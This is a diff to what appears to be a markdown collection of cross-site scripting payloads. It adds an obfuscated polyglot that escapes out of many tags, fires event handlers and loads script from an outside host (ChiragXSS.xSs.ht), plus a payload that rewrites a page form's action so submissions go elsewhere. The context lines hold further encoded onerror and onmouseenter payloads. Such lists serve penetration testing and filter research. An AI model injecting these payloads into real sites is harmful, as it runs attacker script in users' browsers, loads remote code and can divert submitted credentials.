@@ -229,6 +229,8 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   /Orders/(A(%22onerror='alert%60xss%60'testabcd))/Login.aspx?ReturnUrl=/Orders
   (A(%22onerror='alert%601%60'testabcd))/Login.aspx?ReturnUrl=%2f
   "%20onmouseenter=confirm(document.domain)%20value="
+  '"onclick=(co\u006efirm)?.0><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)1"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert2>%22%3E%3CSvg/onload=confirm3//<Script/src=//ChiragXSS.xSs.ht></scripT>
+  "><svg onload=document.forms[1].action='http://localhost/?Hacked'>
   ```
 </details>
 
